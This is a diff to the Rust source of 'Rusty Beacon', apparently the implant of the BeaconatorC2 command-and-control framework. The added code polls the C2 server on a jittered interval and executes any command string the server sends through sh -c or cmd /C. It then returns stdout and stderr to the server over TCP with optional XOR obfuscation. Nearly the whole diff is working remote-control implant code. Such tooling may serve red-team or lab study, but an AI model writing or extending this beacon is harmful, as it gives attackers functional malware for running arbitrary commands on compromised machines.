@@ -11,11 +11,43 @@ use base64::{engine::general_purpose, Engine as _};
 use std::net::{TcpStream};
 use std::io::{Read, Write};
 use std::time::Duration;
+use std::process::{Command};
+use thiserror::Error;
+use rand::Rng;
+use std::sync::atomic::{AtomicBool, Ordering};
+use std::sync::Arc;
+
 
 const VERSION: &str = env!("CARGO_PKG_VERSION");
 const XOR_KEY: &str = "default_key";
 const RECV_BUF_SIZE: usize = 4096;
 const TIMEOUT_SECS: u64 = 30;
+const C2_ERROR: &str = "ERROR";
+
+#[derive(Debug,Error)]
+pub enum CommandError {
+    #[error("failed to spawn command: {0}")]
+    Spawn(#[from] std::io::Error),
+
+    #[error("command failed to with error code: {code}")]
+    NonZeroExit {
+        code: i32,
+        stdout: String,
+        stderr: String,
+    },
+
+    #[error("command terminated by signal")]
+    TerminatedBySignal,
+
+    #[error("UTF-8 conversion error: {0}")]
+    Utf8Error(#[from] std::str::Utf8Error),
+
+    #[error("no command was supplied")]
+    NoCommandSupplied,
+}
+
+type CommandResult = Result<String, CommandError>;
+
 #[derive(Parser)]
 #[command(version, about, long_about = format!("\t\t\t<3 Rusty Beacon version {} Ɛ>\r\nA reasonably simple rust implementation of a beacon for the BeaconatorC2 project.", VERSION))]
 struct Args {
@@ -54,6 +86,8 @@ impl Display for ObfuscationStrategy {
     }
 }
 
+
+#[derive(Clone)]
 struct Config {
     beacon_id: String,
     ip_address: String,
@@ -61,7 +95,7 @@ struct Config {
     obfuscation: ObfuscationStrategy,
     schema_file: String,
     interval: u8,
-    jitter: u8,
+    jitter: f32,
 }
 
 fn main() {
@@ -73,7 +107,7 @@ fn main() {
         obfuscation: ObfuscationStrategy::PlainText,
         schema_file: args.schema_file,
         interval: args.interval,
-        jitter: 0,
+        jitter: 0f32,
     };
 
     tracing_subscriber::fmt::init();
@@ -86,7 +120,7 @@ fn main() {
     info!(" |- Interval:\t\t{}", config.interval);
     info!(" |- Jitter:\t\t{}", config.jitter);
 
-    let result = run(config);
+    let result = run(&config);
     match result {
         Ok(_) => {
             info!("[+] rusty_beacon exited successfully");
@@ -97,15 +131,53 @@ fn main() {
     }
 }
 
-fn run(config: Config) -> std::io::Result<()> {
+fn run(config: &Config) -> std::io::Result<()> {
+    let running = Arc::new(AtomicBool::new(true));
+    let r = running.clone();
+
+    ctrlc::set_handler(move || {
+        info!("[+] rusty_beacon exited with CTRL-C");
+        r.store(false, Ordering::SeqCst);
+    }).expect("Error setting Ctrl-C handler");
+
     info!("[+] polling loop started");
     if register(config) {
        info!("[+] rusty_beacon registered with C2");
     }
-    Ok(())
+    while running.load(Ordering::SeqCst) {
+        info!("[+] starting next cycle");
+        let c2_instruction = request_action(config)?;
+        if !c2_instruction.is_empty() && !c2_instruction.starts_with(C2_ERROR) {
+            let result = process_c2_instruction(c2_instruction, &config).unwrap_or_default();
+            info!("[+] command completed: {}", result);
+        } else if !c2_instruction.is_empty() && c2_instruction.starts_with(C2_ERROR) {
+            error!("[x] C2 error: {}", c2_instruction);
+            info!("[+] Will retry next cycle")
+        }
+
+        let next_interval = calculate_next_jitter(config.interval, config.jitter);
+        info!("[+] waiting {} sec for next cycle", next_interval);
+        std::thread::sleep(Duration::from_secs(next_interval as u64));
+    }
+    return Ok(())
 }
 
-fn register(config: Config) -> bool {
+fn calculate_next_jitter(interval: u8, jitter_percentage: f32) -> u8 {
+    if jitter_percentage <= 0.0 {
+        return interval;
+    }
+
+    let interval_f = interval as f32;
+    let jitter_range = interval_f * (jitter_percentage / 100.0);
+
+    let min = (interval_f - jitter_range).max(1.0) as u64;
+    let max = (interval_f + jitter_range).ceil() as u64;
+
+    let mut rng = rand::rng();
+    rng.random_range(min..=max) as u8
+}
+
+fn register(config: &Config) -> bool {
     let message = format!("register|{}|{}|{}", config.beacon_id, get_host_name(), config.schema_file);
     let response = send_tcp_message(&*message, config, true).unwrap_or_default();
     info!("[+] received registration response: {}", &response);
@@ -132,13 +204,13 @@ fn generate_beacon_id() -> String {
     let result = hasher.finalize();
     let hash = encode(result);
 
-    hash
+    return hash
 }
 
 fn get_host_name() -> String {
     System::host_name().unwrap_or_else(|| "unknown_host".to_string())
 }
-fn send_tcp_message(message: &str, config: Config, expect_response: bool) -> std::io::Result<String> {
+fn send_tcp_message(message: &str, config: &Config, expect_response: bool) -> std::io::Result<String> {
     let obfuscation_strategy = config.obfuscation;
     let obfuscated_message = obfuscate(message, obfuscation_strategy);
 
@@ -169,7 +241,7 @@ fn send_tcp_message(message: &str, config: Config, expect_response: bool) -> std
         info!("[+] Unobfuscated message: {}", deobfuscated);
         return Ok(deobfuscated)
     }
-    Ok(String::new())
+    return Ok(String::new())
 }
 
 fn obfuscate(message: &str, obfuscation_strategy: ObfuscationStrategy) -> String {
@@ -200,13 +272,84 @@ fn xor_encrypted(message: &str) -> String {
         Ok(enc) => enc,
         Err(_) => return message.to_string(), //fallback to sending the cipher text
     };
-    String::from_utf8_lossy(&encrypted).to_string()
+    return String::from_utf8_lossy(&encrypted).to_string()
 }
 
 fn xor_decrypted(encoded: &str) -> String {
-   xor_encrypted(encoded) // xor cipher decrypt is the same operation as encrypt
+   return xor_encrypted(encoded) // xor cipher decrypt is the same operation as encrypt
 }
 
 fn cycle_xor_key(message_length: usize) -> String {
     XOR_KEY.repeat(message_length / XOR_KEY.len() + 1)[..message_length].to_string()
+}
+
+fn request_action(config: &Config) -> std::io::Result<String> {
+    let message = format!("request_action|{}", config.beacon_id);
+    info!("[+] Requesting action: {}", message);
+
+    return send_tcp_message(message.as_str(), config, true)
+}
+
+fn execute_command(command: String) -> CommandResult {
+    let (shell, flag) = if cfg!(target_os = "windows") {
+        ("cmd", "/C")
+    } else {
+        ("sh", "-c")
+    };
+    let output = Command::new(shell)
+        .arg(flag)
+        .arg(&command)
+        .output()
+        .map_err(CommandError::Spawn)?;
+
+    let stdout = String::from_utf8_lossy(&output.stdout).to_string();
+    let stderr = String::from_utf8_lossy(&output.stderr).to_string();
+
+    match output.status.code() {
+        Some(0) => {
+            let mut report = String::new();
+            info!("[+] Successfully executed: {}", stdout);
+            if !stdout.is_empty() {            report.push_str(format!("STDOUT:\n{}\n", stdout).as_str()); }
+            if !stderr.is_empty() {            report.push_str(format!("STDERR:\n{}\n", stderr).as_str()); }
+            report.push_str(&format!("Command executed (exit code: 0)"));
+            Ok(report)
+        },
+        Some(code) => Err(CommandError::NonZeroExit { code, stdout, stderr }),
+        None => Err(CommandError::TerminatedBySignal),
+    }
+}
+
+fn send_command_output(output: String, config: &Config) -> std::io::Result<String> {
+    let message = format!("command_output|{}|{}", config.beacon_id, output);
+    info!("[+] Sending command output: {} chars", message.len());
+    send_tcp_message(message.as_str(), config, true)
+}
+
+const NO_COMMAND_RESPONSES: [&str; 2] = [ "", "no_pending_commands" ];
+/// process command from the C2 server
+fn process_c2_instruction(c2_message: String, config: &Config) -> CommandResult {
+    if !c2_message.is_empty() && !NO_COMMAND_RESPONSES.contains(&c2_message.as_str()) {
+        let instruction = c2_message.split("|").next().unwrap_or("");
+        match instruction {
+            "execute_command" => {
+                let command_parts: Vec<&str> = c2_message.split("|").collect();
+                if command_parts.len() < 2 {
+                    return Err(CommandError::NoCommandSupplied);
+                }
+                let command = command_parts[1];
+                let output = execute_command(command.to_string())?;
+                let result = send_command_output(output, config)?;
+                return Ok(result);
+            },
+            "" => {
+                // C2 may support 'simple command execution'
+                let output = execute_command(c2_message)?;
+                let result = send_command_output(output, config)?;
+                return Ok(result);
+            },
+            _ => Err(CommandError::NoCommandSupplied)
+        }
+    } else {
+        Ok(String::new())
+    }
 }
